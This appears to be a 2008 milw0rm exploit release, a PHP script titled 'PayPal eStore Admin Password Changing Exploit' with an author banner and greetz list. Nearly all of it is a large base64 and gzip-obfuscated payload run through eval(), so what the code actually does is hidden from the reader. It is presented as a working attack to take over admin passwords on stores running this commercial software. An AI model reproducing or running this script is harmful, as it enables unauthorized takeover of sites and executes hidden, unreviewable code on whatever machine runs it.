@@ -1,0 +1,104 @@
+<?php
+/*
+==============================================================================
+                      _      _       _          _      _   _ 
+                     / \    | |     | |        / \    | | | |
+                    / _ \   | |     | |       / _ \   | |_| |
+                   / ___ \  | |___  | |___   / ___ \  |  _  |
+   IN THE NAME OF /_/   \_\ |_____| |_____| /_/   \_\ |_| |_|
+                                                             
+
+==============================================================================
+                      ____   _  _     _   _    ___    _  __
+                     / ___| | || |   | \ | |  / _ \  | |/ /
+                    | |  _  | || |_  |  \| | | | | | | ' / 
+                    | |_| | |__   _| | |\  | | |_| | | . \ 
+                     \____|    |_|   |_| \_|  \___/  |_|\_\
+
+==============================================================================
+	PayPal eStore Admin Password Changing Exploit
+==============================================================================
+
+	[»] Script:             [ PayPal eStore ]
+	[»] Language:           [ PHP ]
+	[»] homepage:           [ http://www.webberco.com/ ]
+	[»] Type:               [ Commercial ]
+	[»] found-report:       [ 26.11.2008-02.12.2008 ]
+	[»] Founder.coder:      [ G4N0K <mail.ganok[at]gmail.com> ]
+
+===[ LIVE ]===
+
+	[»] removed...
+
+
+	
+===[ Greetz ]===
+
+	[»] ALLAH
+	[»] Tornado2800 <Tornado2800[at]gmail.com>
+	[»] B13
+	[»] AFSHIN-ZARBAT <afshin.zarbat[at]yahoo.com>
+	[»] QU1E <evilinhell87[at]yahoo.com>
+	[»] Hussain-X <darkangel_g85[at]yahoo.com>
+
+	//Are ya looking for something that has not BUGz at all...!? I know it... It's The Holy Quran. [:-)
+	//ALLAH,forgimme...
+*/
+
+error_reporting(E_ALL);
+		$G4N0K = "vVlJl6LKEv5BtXgMWiWLtwAUSApRkTF3DFXMymkVxF9/IxO0tOp19T39+vQiD5JkRsYcX6TYM/dR".
+		"L87W8zNyF+xyvtnPkGOtN6yFnYWThpp1jGRp4zr6cussU5QzrcHGl00/ay3FWiAlo/vQfHFaypIT".
+		"18op5iom9IRT4HWtwbgrlIs50GHi+b41+IRP+im/7KdtXMetq6D2Tc2YyOvOBmM5lixM6JnzxTHR".
+		"9CzamU2iVm1UKwejthgsoyfC48jXJPLOp/jC/JT+0i6nq+1I87pXdTM8n5hycT5i38oQnJ9oIvxW".
+		"2NAPBFSabbSzqmi3Obpa1eEtSgNOOCWqe0rmTA7PSSIL+0RlD6teKkJV6WPOZdau61g5MwF523XK".
+		"vK41C3g/V+tKyt5cKQN+K4e3gC8n3XjWMfQmqaMql5hPYG6Tbrgsi+qkieo4tfysi1ShSWRphhYx".
+		"YxeSsZYFJvStA7Yp75dEqw54KzFvvlSttzqD/YwxOPMS90TOJo84a/rWMa+yh1siC64VOPM8XVVW".
+		"FqrCMdh2KSrPbMBVZbCVNGI7rDq5IYu5rblF6IFuFBNssExdb9qADkrQxQEpuIprC3hdHNBC6UMP".
+		"bCNLCHtnDvQJ62Beo/uOoBf4HryA3vWgVoqQS/qId09YZouIO7dxsS82jDknY3XHK/jQM7b3k1jb".
+		"wN5GgP2mDDrFdVVFqnWBc0aaQo9Vt1/twGZqVaK50r3JYmEt3AV4k0Jovm/u923SSHV32JuWSDsA".
+		"zaqOuClj+EkVesk+mRO9nUuybzi3qUPPPWDNrMAWbCR36SOt6pGPQnxBKpvFxI7FvgP/6ALPKkNv".
+		"uhu+nZuYB/l4axqpznNUCydsAx87xpRr3IAOS+JLZN1gO/OAPaVf1XqbqCk9C868JDI72N9uTsB/".
+		"RXXnSxlWLeI/z0tb6t7mI930UX7gpUtG/eH63Ab+5hl0Uifz/8lHFtTugfLiJw3WrP2qWDBLTZqM".
+		"9jpEnMKs6nOFdxtKc4gPNgM+d1HR9INeqa5vujB8vcFcxqwK84PPfFomufTy4Cfzhg/VisH28Rj4".
+		"+g5i5jnwXSa6HPOI10vso2d0CTizgJGL51hL05gTDqG3eUnAr0Fnz+ZF7GD+hfgBxNCoNxJDXXuX".
+		"C2i80LgFHQIfRURiE3IL1oL8bn7cf80DNzkL8CmIQfSCisks1vSK7rEZ4W8M0HuKZPGnw+/H38rs".
+		"6xwd0vvD/N26TwPsJH5z1iz1B3ozpHXDHDzf79YYvRR/zN+t+zxE5vUbmVrCo/+JPqV3z8t4Fpn3".
+		"+Uc+7sd3+gN+3312OIvSYYX3Qb4znR94Ed6Hs8j50vD9O/0tqhVSLGRtpdXGYRW0EFQkC+8G1T3Q".
+		"Hc+BMZ4Dv4F/g5211EaKEJP5q1y/ob8/On7lf39wQKz+nZhab36hP2Jzan9q7/f7OBpiS7r6B32/".
+		"/v4N/Q3+xQ/xcvVxeMZX3yc+ipRujIVZavTib8Xv+73/amfqe6NPx9dY/XiKOxJjP+X7W/8b4uf9".
+		"GkfU74WB7k2Oa8yS8ydjXvk3+pOUN02CulQxaKFPCe/X+KEyknOuT4XwQOMJeABZCE80/sTfzH9/".
+		"cIh/s340m8CvNoDZU+yaDNTWCrBdGXnVCSlSFvMmT+otWpj7AOo3qeFo4U5i9dyG/uavxiTU8A4w".
+		"9BM8S8DrBOvSHoTgEX2B107JCGjezdYLQEMfdXus00wecC7B8j3UaVL3a5DrCHiVefPOBEfzgHuZ".
+		"cL5nzQFD5UhVCtqDwN633np3GHfrlu7W65PNVpHI+9LKk+Qd+oTIcxnA1iXQ6SLeZOgZgP8Bh6TY".
+		"T58hx18CXm8A17YEK63VD6xF8IJsnwHvJVVUb57WKnrS62ke8+IL1IkJ0sQUeogWqWWayPgU7Mxu".
+		"denaAPCGwQH+4ghemsyCHUqNC5yblrPE64DOuVkX50Pg6RXsB3mRgHaAy11Bs8tDvi6zFjDpM+hz".
+		"WDMf9g44cZOOWFVAgEEB91eA2dOlT/gZMbdM0NfyhreWdkzxFsqlBpN+CbCezySrbQ/6gR6EYqe7".
+		"uYT0WDc8Be/Q6yUenJcjYuNDaA/8RGpJZKF4FKkYegcmj1WhT5RRjnzUCSu18e7PyWPOr35QjXbV".
+		"mc/y3POBNGsaE/rQQ75pG3jHWaS54FtospT/jUwKE36VifjQn5Pp8ihT4Fv7rzJ98PGNTC0a/K+5".
+		"+i/IBnIpOSa5BPoioH9KeInHn2ViplXSs5B3zEvCQf803xM6VBcjrSbaSSz0XTfMfeuzHrF+ikgH".
+		"cDleY5en/QnIAt9AJ1M+1pLys3zRLukSznq3mKkBvvrQR8M7F3hnlqyj8vHAE/QLg730HureE41f".
+		"WfjoDz9i7yEGrzYaeEnaz3xgTvjMwyXx9CPk1Ts961LAQ2/HTTKaUz7T3ekVySFfbFi7pFf+TL/H".
+		"Puln72KtGvYTWW+8g7zEfpFN7As5dMiXeUzuN67PlObjax5WrZL0+k2Dc3Efgl2h39zrirCxWdOB".
+		"fLmLWOoDO39bpnoepF/X6GxcVwO/FdMgOaiRrFSRD7xv09JnpbXDWtF9/vqG1p1f68nrVqz1XMyw".
+		"x3aJVn6zrkwhz3eQE9P1Vszt2uXH+xohGJ41maN3N5cF5KnJB18PvqYnRo7u1qJfriX0XF8qgZ9K".
+		"t1HngE2g9pwwv8xXvVVAv3oKuKwNe1EgNSuGvjvK0zKG36/2oQxr4QfewjdZp7IhGZ1+JqeR6xlW".
+		"2SbKBeIjDKnpcT/tQk38T6QKO+i/AT9ljquI7XI7OfuaHkdjrfhE995mJ1Sde1+duuTux3AUctfC".
+		"rHLJjPimiSDXGRfntJTFvcuBXKrAx5dD6towru+9tHJlkTWKxQsCeQ3XtVe91CfF/mwUZYMWSRVw".
+		"x9a4oG45TzvTRtPlPEituuqxh9s3eXYxCimOq/Npy7lVLLMS5EAO25ATL2I3yAF5sZ5WY0w9I/VY".
+		"YV88Qsw3Se3SvZvrnZ/MOiRuQIYsBlwZemZG8UAuTAyf3DeyFEMYvttH1D5CiT3rM40l6GFHci/V".
+		"nWru4R3sKfwAO9C1lK8cvehq04ackxoFk+oa5D55kt++aRCnxPYyIv6QJZqVBdwB/FSqIRcWISd0".
+		"2Jv8LJ4O977wUcfAF2SoGTv9FPVdqkN+jXfgW3mXmrbYrLiqfpUXxCeZwDN/vPrHivjgq4w+8l0x".
+		"5UOoF4CVeryVpsFWKiNiz35yMvJFes2ZDu8eEzWjd5wJwWGyxMfkDuy6Thby9eccQ/IQ2G+do2YF".
+		"uDTRQM/FUcD07jrNH+9l2BjV9A6R3K31kacc0Dzr4BzgPWsjb/ECda3EJKZ6FrAWZlaFQ/GKD7XZ".
+		"648Jmp8BE938o8Iy8EZ5mT1R/qrDD38rEpltco9IsTCxiw++xm9ADppDKd+AzfJX+1gngPkS1dnr".
+		"oKME8GTYd2OsllCTQR/wDXm4irjgbk3ZQB6CXL08rT28gxi9vMo3m4Mu2Dogd6jcPd3yJfSC9JXm".
+		"hgp0gvaDz0DvszPZgDOBR7NOvPPhbYuaqy0hX0SvLAMyTT7unlUXcMMnm9xkn8ygNhD7jfe4oHeo".
+		"QVjp8vXurl9Qh34Be4NeDI7iH3rn+pXmdIX9OI3v7sRDf5lCrc+NHHD3QrBd5fBYt0m+GfR88zFi".
+		"Q4KdwReH/kUD7A+YYnVbt0hD0AkmPNf07v/Z6GcPZ3zgU5InP+bvMZG/neRjPWiJ74z/I/zftEA/".
+		"2dcY+NfPC9A93foZt8upnebNieQo0t+tNIkBPDf8B2AfH+7hVyzYr7z1delmV6bWxVotF4fBfrzZ".
+		"Bd7khoFuzxEDIIhLyNkH8EmoodIX37IhP0H+OkBPfomBtgF97lpzniBWGaRgNlKnVVwrOcQDnOU8".
+		"kb7fyMUT+OHgO9+ci+szG3PpHupg+r6VqggwGdIO6ZAnxNIqha1tH8ld6X//AQ==";
+		eval(base64_decode(gzinflate(base64_decode($G4N0K))));
+?>
+
+# milw0rm.com [2008-12-07]
